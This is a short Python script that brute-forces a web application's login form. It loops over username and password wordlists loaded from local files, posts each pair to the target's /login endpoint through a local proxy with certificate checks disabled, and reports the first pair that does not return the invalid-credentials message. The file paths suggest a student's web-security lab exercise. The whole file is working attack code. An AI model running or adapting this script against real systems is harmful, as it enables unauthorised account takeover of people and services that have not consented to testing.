import requests
import sys
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def brute_force(url, session, userList, passList):
    credentials = ""
    for user_ in userList:
        for pass_ in passList:
            data = {"username": user_, "password": pass_}
            res = session.post(url + "/login", data=data, proxies=proxies, verify=False)
            if "Invalid username or password" not in res.text:
                credentials += user_ + '   ' + pass_ + "\n"
                break
            else:
                sys.stdout.write("\r" + user_ + "    " + pass_)
                sys.stdout.flush()
        if credentials != "" :
            break      
        sys.stdout.flush()
         
    return credentials          

if __name__ == "__main__":
    
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('(+) Usage : %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)
        
    userList = []
    passList = []
    
    # current_directory = os.getcwd()
    # print(current_directory)
    
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\users.txt', "r", encoding="utf-8") as userFile:
        userList = userFile.read().splitlines()
        userFile.close()
        
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt', "r", encoding="utf-8") as passFile:
        passList = passFile.read().splitlines()
        passFile.close()
        
    session = requests.Session()
    result = brute_force(url, session, userList, passList)
    
    print("       "+result)